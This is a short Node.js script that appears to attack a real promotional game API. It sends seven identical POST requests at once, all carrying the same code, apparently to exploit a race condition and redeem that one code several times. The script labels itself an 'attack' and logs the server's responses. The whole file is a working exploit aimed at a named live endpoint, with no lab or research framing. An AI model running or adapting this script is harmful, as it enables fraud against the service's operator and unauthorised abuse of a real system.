const axios = require('axios');

const TARGET_URL = 'https://fahasa-game.cdp.vn/api/update';
// Single code, multiple requests
const CODES = Array(7).fill('ABC21'); 
  
  async function attack() {
      console.log(`🚀 Starting SAME-CODE attack on ${TARGET_URL} with 7x ABC21`);
    
    // Tạo request đồng thời
    const requests = CODES.map((code, index) => {
        return axios.post(TARGET_URL, {
            code: code,
            status: 'PLAYER'
        }).then(res => ({
            id: index,
            code,
            status: res.status,
            data: res.data
        })).catch(err => ({
            id: index,
            code,
            status: err.response?.status || 'network_error',
            error: err.response?.data || err.message
        }));
    });

    const results = await Promise.all(requests);
    
    console.log('📊 Attack Results:');
    results.forEach(r => {
        console.log(`[Req #${r.id}] Status: ${r.status}`);
        if (r.data) console.log(`   Success Data:`, JSON.stringify(r.data));
        if (r.error) console.log(`   Error:`, JSON.stringify(r.error));
    });
}

attack();
